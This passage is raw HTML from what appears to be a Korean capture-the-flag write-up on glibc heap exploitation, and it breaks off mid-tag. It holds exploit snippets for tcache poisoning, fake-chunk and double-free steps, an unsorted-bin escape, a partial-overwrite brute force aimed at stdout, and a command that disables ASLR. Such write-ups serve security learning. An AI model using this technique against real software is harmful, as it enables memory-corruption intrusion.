url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsTAAALEwEAmpwYAAADEElEQVQoz1WSy24cVRCG+xUQijBERjISiYSIhE1M7BnPpadv0326z/Tt3Prcuz1je8b2EDsXiCUUCbHJDolFngPlBViy4J1Qm2yQallflf76yknGbjzy4oPhdOjPZ2npsbW9vWpfbvTN2rw4l9tkUh5+M/aPM5IaBg2FlmSmybt4mDuwovhspX9/o9+9Zu9uF+fd6dn1avP8bLPtzrdXz1/Diuw9+nbig+X65uLy+cXVi/PLm8vtq4JLJ4nz8sfly3/e//zXH2/+fg/vzgqIUaMw4xURXNnR1Huws7t/NKyEwkoiZWqpmLJzjp20QDnmc4wChCY5nDaVuFzL6428usBnK3W9mRVw97snA5SxzYXcruX2Ulyv7e02wrUDijqvm0WOYY6DEJz4YbNc8uWq6dqcCWLsKAgffv3o6WCMGsOkZtKSRlFp/Sj5uBlWGBR4FiXDqU+FJsI00hBhdbeaeOEnD744eDbE0jKlqWqJ1Nwu5yl0krzOEcsKDHI0i8BgGlBpaN9nsDDCdiHI9g+PB1O/YopJTaUloodjuHCyEpVELCqaFihMsqEbUNVS1TbaEmm57WCFXv10583TslGNtlS3VBrRLWOY38OYLyqcFThK4NANmG6Z/girbuVFyd0vb384mdbcMGX60dKI9h5OSpwTkdU0yWs3jAcTn/RpNZUac0Olrgj788OHGJYVU8J23HRMter0HCwKB7gB8GPgBkEEYlieuEHdSCIM4apiikhT0ebtr78djaZjP/bnwJunswgECRyMXSedeOksXPRwmizK0SwsKcdc17QpiaDSeHPw6WcPHz/Zn4bJLOrLDRM/yY5HUwdUpGAqQyyriDcHg4l/fzDbZxZ95okfff7lV4eDMdWnwnaiXXLTmdVFmpcO6FU1sERpiSMAe8/K9rCyuIeXbjDf2d37/ugE8f5JqLL/eY6zXhW+V0XSAgVxdvL/a+vTlRv28NPjUf8k2rBelZXdKoG5E8NyUbM0RyDv4ePxDHGFuMJcVkw2ph174c7u3sGzYckkbiTiqmaC6jYC2b/2TzxLhI1ONAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4_1.png\"\n        title=\"./4_1.png\"\n        src=\"/static/2942358e137802a86bff75bb0928b56a/5f759/4_1.png\"\n        srcset=\"/static/2942358e137802a86bff75bb0928b56a/e9ff0/4_1.png 180w,\n/static/2942358e137802a86bff75bb0928b56a/f21e7/4_1.png 360w,\n/static/2942358e137802a86bff75bb0928b56a/5f759/4_1.png 469w\"\n        sizes=\"(max-width: 469px) 100vw, 469px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>0x555555757260+0xd0 주소에 청크가 존재해야 하며 해제할 시 정상적으로 해제가 가능하지만 아직 해제는 불가능 하다 정상적으로 할당된 청크가 아니기 때문이다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 471px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 34.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABVElEQVQY0z2P21KDMBRF+Yz6UGfqiw86tmqt9VZtKQUkpCHkciAhJIFW/f8fcFDHmfN2Zu21d7C7WUTzZXJ7//K6TTF9eA1RwTADRMp3wvccdhk+v5yenV9c3S6n87+b3T1czuZBXgoqNWGAGWyT7GUTK9cr19fGYgZCNc9v29F4cnP/JI3XvtP+qGxvj1+45AEqBBEqLzgqxDbNnte7yjgwrjKWKaN99xYlo/HkevHIlIWmBeOkbpXrMWVBVjDCq5xwVPAwzp7W0fBubGWs0NZ0h80uHY0ns8VjqcwAN078wDllQU6H2piKHzMazK0fzK3jv3Cc/pq5HhKh9bKx2h+G2nsmS2j2pcxLiNJ8FQ6ba9tr14Hp7OEzjN//Nyvrle2r1pv+gzAZxIhkhCeIxKhYhfFyFVJQVNYl1ITXUpvVJjo5PZvOl5hXVFQUFOGwZ7COkm/Pr4CKLJurVAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/5864bba5e66045b88f0ec3e916611759/1f09d/5.png\"\n        srcset=\"/static/5864bba5e66045b88f0ec3e916611759/e9ff0/5.png 180w,\n/static/5864bba5e66045b88f0ec3e916611759/f21e7/5.png 360w,\n/static/5864bba5e66045b88f0ec3e916611759/1f09d/5.png 471w\"\n        sizes=\"(max-width: 471px) 100vw, 471px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"how-to-free\" style=\"position:relative;\"><a href=\"#how-to-free\" aria-label=\"how to free permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to Free?</h2>\n<ul>\n<li>첫 번째 할당 때 FD의 한 바이트를  “\\x70”으로 덮어 써 Fake Chunk의 데이터 부분을 가리키도록 한다. (FD: 0x555555757270)</li>\n<li>두 번 할당시 해당 영역에 할당 가능하다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxUlEQVQY04XOS26DMBSFYdaR4Idiw7WNbfADMORWSpGM1P1vqBPUjtpI//TTOU15jfhh8Wud65Iw2jCERaei06bBKioUk3/W3M9CvGsx3mvm6eC94x3wTvHuP3bhtq7UWYK5rQuLn6xzTMJbdmFyFupti+l2ziy+qHTkcb19O97cJs/BC5dt3OVU+4QqpjEr7fpU+ocCIhSVvzEBPzVbVuvkj4JHKvux63lRM8qA0oQMZlVDgMGDcWDGXoMNLCNPTxY2YcZvSPE6JFhCjZkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/e6dfc16b39d3dfac66363bbec59aee3d/37523/6.png\"\n        srcset=\"/static/e6dfc16b39d3dfac66363bbec59aee3d/e9ff0/6.png 180w,\n/static/e6dfc16b39d3dfac66363bbec59aee3d/f21e7/6.png 360w,\n/static/e6dfc16b39d3dfac66363bbec59aee3d/37523/6.png 720w,\n/static/e6dfc16b39d3dfac66363bbec59aee3d/914ae/6.png 860w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>FD를 Fake Chunk의 주소 값으로 조작하여 첫 번째 tcache가 Fake chunk의 주소 값을 가리키는 것을 확인할 수 있다.</li>\n<li>두 번 할당시 해당 영역에 할당 가능하다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">fake</span> <span class=\"token expression\">chunk</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n# <span class=\"token number\">0xd1</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Fake chunk\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 582px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAACoElEQVQoz3XS21LTQBzHcR5EaaENthUQWui5kNL0kGOz2d1kTzk3oYEqdbzyBZzRCx/FGd/QqchoL3yAz/z3O789mHX6Wqt30+xPJkZ7cGu6RLUdFaDRdH7cOD2qn172h+ed3ul157zTq122jipvJKleqtZK1dqBptn4Y+5//US+bI11SPMMrxIQh3YgLm5GlWYTRiG9z2me8fW94dNyvXFYefMHA8iS75+3P75++PkNfyrCMAuTnIqEifiy2Tmqn/GHdbx9ip826faJFNnx2dnh8Qs2ALagt7DheG5MEIi278WmYA/3dJ217uRq+xqJgCUrFidilZsQlyonz3KHFyYwAdYteDfTBrICuQ88ZkCsLcF5q10+aeg2clwOXAqJUE279PLmHdYBNh1XNYGyMGVFpUGMWYCoQB5/1+yUpbcO4Z6IPBHSILagW5ZqfzGiPhExJEK30VSzVg+bOC/S4jEtNlfdYVlq8GiVrDfxfbEq3nsi2MO6jZaImo47Vc2byZyGiSdC4sfEjy+uu6VqzSGchQkNIh6lNvb28HRhqIY9Xejjud6/nTjecx53XNZs96XGu7lhGwAbAFnQU1Rjr9kYytZQnsqKZiN5riIe2C4DRFguuVEW3dF4IE8GstIbjXujcas7LFf/uQxZ4PkJjzMbU31mPqRF6PkccQZo97r/ulrzkzzKCiJil0cW9I5PGoeVF6xajgnwEpGpbvnKciuyAgc58h9hoHZuX0k1GxPMA0gF5oEB0F7zwgS7JMe9WxjyeMZ5SInPWMho0LzqlqS64biOxx2PISq0pbOHLUhstPsAmuXczjSeZF4Q0yilUXrR7pVPGpgHPFqxMBFJBlyyh+HvnVmYmo6rqOaq2O2crB/T9eNVb1CWGixK/7fzL2d//jmqFT1mAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6_1.png\"\n        title=\"./6_1.png\"\n        src=\"/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/7c1cd/6_1.png\"\n        srcset=\"/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/e9ff0/6_1.png 180w,\n/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/f21e7/6_1.png 360w,\n/static/dd7f3d4fe9a351c9cbf22ca5c2c9a96c/7c1cd/6_1.png 582w\"\n        sizes=\"(max-width: 582px) 100vw, 582px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>포인터 배열 6번째 인덱스에 Fake chunk가 할당된 모습을 확인할 수 있다.</li>\n<li>해제를 세 번 한 이유는 <code class=\"language-text\">tcache->counts</code> 가 underflow 되는 것을 막기 위해서이다.</li>\n<li>free시 tcache→counts++</li>\n<li>malloc시 tcache→counts—</li>\n<li>만약 할당 과정에서 두 개의 tcache를 사용하게 된다면 다음 할당 과정에서 음수 처리가 되지 않기 때문에  255 변환되어 underflow되어 tcache를 사용하지 않는다.</li>\n<li>tcache는 7개 bin만을 관리하기 때문이다.</li>\n</ul>\n<h2 id=\"free-fake-chunk\" style=\"position:relative;\"><a href=\"#free-fake-chunk\" aria-label=\"free fake chunk permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Free Fake chunk</h2>\n<ul>\n<li><code class=\"language-text\">0xd0</code> 크기 또한 tcache에서 관리하기 때문에 unsorted bin이 되지 못한다.</li>\n<li>해당 청크를 8번 해제하면 마지막 해제할 때 unsorted bin이 되어 tcache escape가 가능하다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">fake</span> <span class=\"token expression\">chunk</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n# <span class=\"token number\">0xd1</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Fake chunk\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">escape</span> <span class=\"token expression\">tcache</span></span>\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">unsorted</span> <span class=\"token expression\">bin <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> escape <span class=\"token function\">tcache</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAABsElEQVQoz4WS63KaUBRGfY5UPIggh5tCVBANYgSpyP16uIka0/b936CTZNpMzVRn1r89a749394d2RRVbTT35+JGFpVHToQThZ0oDC/CHgnBTToPWwXj+Qdz1l0tcHYJyCG453zKmKH0eL5rypi+wNkFIKmPQW/wxh25u5YBJ3zbzDBtgXNPYMiCIQMoSECmT79vPqA/uZJxSA8pYcaqU04fyAYrr9XV43Q6UJckw1H9AcRpDkAB0AKgOfxKdk1l+/zkumaW73coslaGxo8NVbU0TZcXE8iRoxmYafhk2ZfmBMX8I3tBFiTF2nLi4pCgxnJDkpfcGCVV66cFxY2xPgWID6677HgJCtJivbXzpkXN0fYiKEhBVtSnS141kB9jBA1I5p0vhXlx7sdIN+28bov2vPffZD8tqtMlb1paEDHiv8freEnuJ+h5a2d125x/RHn5J/kVNScoSLdkN8q8ONfNXVYdyvbFCROal4IUVccLalp4O9lPyzArN9a+PJ4Pl59BmkNBilF9fP1Vny53ku2t7bqhqhuWGzhRauwcih1vvjtOmOy8kOJGvS+/8Vf+DWsfmow9E01cAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/4888cd178a7732d198d147e63ff153e5/37523/7.png\"\n        srcset=\"/static/4888cd178a7732d198d147e63ff153e5/e9ff0/7.png 180w,\n/static/4888cd178a7732d198d147e63ff153e5/f21e7/7.png 360w,\n/static/4888cd178a7732d198d147e63ff153e5/37523/7.png 720w,\n/static/4888cd178a7732d198d147e63ff153e5/59822/7.png 916w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">0x555555757260</code> Fake Chunk 부분을 8번 해제하여 마지막 한 부분이 unsortedbin 값에 대입된다.</li>\n<li>unsorted bin으로 넘어가는 부분에서 FD, BK 위치에 main_arena 주소가 담겨 있는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"point-to-stdout\" style=\"position:relative;\"><a href=\"#point-to-stdout\" aria-label=\"point to stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>point to stdout</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 572px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABrElEQVQoz03QW2+iQAAF4P6JfWig3grVNrbBWMERYQYYYATkMjAOghRdTdy2+/+fN12bdZPzck7yvZwbB5gBdAjE/jpDmESUsW1DeUV5NQNLsS8rMwAxQe4KuSuIyWisdO6HXWnUlUY3FlnHrAyzjR+lwLSTnEd044WxFyY6wkJPMmyP1W1alAkrY8om6kLsyz358Qu7YZLzKkpZkFCICd+1vGnzsq7aI4mS284AeUG1PxbbXVE127e9qptXTOKc1y3ldZyXlhfU++Px/XdzOO32Jz+MbzsDm4SH8+fP8/vh/HH69aEuDOEftvwoppso27hBrCOcspLv2pSVSVEixxd68tJyWd2yqimqpmzayxHfGLnBOitImGKyBqYdZQXldVJwymuI/R9CF0An21QZ2yZsm5e1ujCuGM+A+6r5wIR4tYpzw3Kn8+XcQADawLQn6kKZAW1pvYKlZliqDqXH5+vb9gzYUy1EWNUhgI6OsOH4lhdYfhAkFAfrBbRN23+ZasPxZDhWLuwbz58nYKyYU016ehF6ktiX7wYPYl8W+7LQu/9a/ta7wcMl/+M/zbiE+dy/phkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/eaee5a88b2a3cb62c01f43e504f2c91c/a805e/8.png\"\n        srcset=\"/static/eaee5a88b2a3cb62c01f43e504f2c91c/e9ff0/8.png 180w,\n/static/eaee5a88b2a3cb62c01f43e504f2c91c/f21e7/8.png 360w,\n/static/eaee5a88b2a3cb62c01f43e504f2c91c/a805e/8.png 572w\"\n        sizes=\"(max-width: 572px) 100vw, 572px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>stdout 주소와 main_arena 영역의 주소는 가까우며 1.5byte brute-force를 통해 main_arena의 주소를 stdout 주소로 조작해야 한다.</li>\n<li>ASLR을 끈 후에 익스프로잇을 작성하자</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">sysctl <span class=\"token operator\">-</span>w kernel<span class=\"token punctuation\">.</span>randomize_va_space<span class=\"token operator\">=</span><span class=\"token number\">0</span></code></pre></div>\n<ul>\n<li>미리 할당한 청크를 Double Free해 unsorted bin 청크 위에 새로 할당하고 하위 바이트를 덮어써 stdout 주소로 조작 한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">point</span> <span class=\"token expression\">to main_arena address of unsorted bin</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x70\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">stdout</span> <span class=\"token expression\">brute force</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x60\\x07\\xdd\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABX0lEQVQoz43QW0/CMBjG8X0Nomtxa7u3HVvpJuDmNgVkDJHTFpGDIorh+38EM4ULE0/J/6I3v+R5q6m47sW+k4bc88Dhdp1zl1cpYPJ3WiVpVHxZ6QW6CHUDPvuPLLF+dY4a8iQNkBMiKhABTMsQKdPJlwc2rWMMm5Zm8BqzVM2OoHYh68pTXEpm1yzDsAgBSsD8iBEwKEfgVsHBloN4vcqEliU8iuSw34yzlt3ogp9JFaS9/k2373GnxYRiwmPCpmBQURpwMThIqBLneT6azib3xerlNUmHshXPFo93+dxyPUzApNyg3KQcH2azz8GH2aNimY3ydDhdPG7b6cC/uFw/74qHFbPlqcHw8ebvP2w6X96O8+G02Oz2N4M7P4ifXveLpy04Sv/AP3XGhDYpHm7HRTaebXb73mCkmuF6+zZfb/6FO1E7uepetnvhdbcRJq7fijv9IOmYYCPT+h2/A9VTbYknm/zyAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/77760310dd7914b3f7438543febc9f5a/37523/9.png\"\n        srcset=\"/static/77760310dd7914b3f7438543febc9f5a/e9ff0/9.png 180w,\n/static/77760310dd7914b3f7438543febc9f5a/f21e7/9.png 360w,\n/static/77760310dd7914b3f7438543febc9f5a/37523/9.png 720w,\n/static/77760310dd7914b3f7438543febc9f5a/302a4/9.png 1080w,\n/static/77760310dd7914b3f7438543febc9f5a/dc61a/9.png 1147w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        